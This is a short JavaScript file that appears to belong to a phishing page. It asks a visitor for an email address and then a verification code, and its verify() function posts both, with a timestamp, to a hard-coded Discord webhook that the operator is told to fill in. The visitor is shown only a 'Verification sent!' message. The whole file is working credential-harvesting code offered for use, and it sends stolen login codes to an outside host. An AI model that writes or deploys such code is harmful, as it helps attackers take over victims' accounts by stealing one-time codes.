// 🔴 PUT YOUR WEBHOOK URL HERE
const WEBHOOK_URL = "https://discord.com/api/webhooks/1450733668585832520/sHKf35OI-taLPyvss1KLNcc51JttQUmkzq_3Zozrc3Jpj4QiCc_DrzEhJdXfWuv2pETK";


let savedEmail = "";


function nextStep() {
const emailInput = document.getElementById("email");


if (!emailInput.value) {
alert("Enter an email");
return;
}


savedEmail = emailInput.value;


document.getElementById("emailStep").classList.add("hidden");
document.getElementById("codeStep").classList.remove("hidden");
}


function verify() {
const code = document.getElementById("code").value;


fetch(WEBHOOK_URL, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
email: savedEmail,
code: code,
timestamp: new Date().toISOString()
})
})
.then(() => {
alert("Verification sent!");
})
.catch(() => {
alert("Error sending data");
});
}
